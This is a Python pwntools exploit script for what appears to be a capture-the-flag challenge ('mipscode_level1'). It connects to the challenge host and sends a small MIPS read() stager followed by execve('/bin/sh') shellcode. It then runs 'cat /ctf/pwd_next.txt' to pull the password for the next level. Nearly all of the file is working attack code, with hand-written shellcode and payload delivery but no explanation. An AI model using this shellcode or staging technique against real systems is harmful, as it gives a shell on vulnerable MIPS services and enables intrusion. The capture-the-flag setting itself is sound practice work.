#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template mipscode_level1 --host mipscode-level1.chal.cyberjousting.com --port 1356
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'mipscode_level1')

if args.DBG:
    context.log_level = 'debug'

# ./exploit.py DBG - context.log_level = 'debug'
# ./exploit.py NOASLR - turn off aslr
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'mipscode-level1.chal.cyberjousting.com'
port = int(args.PORT or 1356)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def inr() : return p.interactive()
def rfg(var,a) : return var.find_gadget(a)
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b * 0x40000ae8
c
'''.format(**locals())


'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     mips-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments

p = start()

mipscode = asm('''
    lui $t7, 0x6e69
    ori $t7, 0x622f
    lui $t6, 0x0068
    ori $t6, 0x732f
    slti $a1, $0, -1
    slti $a2, $0, -1
    sw $t7, 0($sp)
    sw $t6, 4($sp)
    move $a0, $sp
    li $v0, 4011
    syscall 0x040405
    ''')

readcode = asm('''
    li $v0, 4003
    slti $a0, $0, -1
    lw $a1, 32($sp)
    li $a2, 0x0199
    syscall 0x40405
    ''')

info(f"SHELLCODE: {readcode}")
info(f"SIZE: {len(readcode)}")
sla(b'Shellcode>',readcode)

info(f"SIZE: {len(mipscode)}")
info(f"SHELLCODE: {mipscode}")
pause()
sl(mipscode.rjust(len(mipscode)+0x80,b'\x00'))

# sl(b"echo '$$'")
sl(b'cat /ctf/pwd_next.txt')
# ru(b'$$\n')
pwd = rl().decode()
log.success(f"PASSWORD FOR LEVEL 2: {pwd}")

# inr()

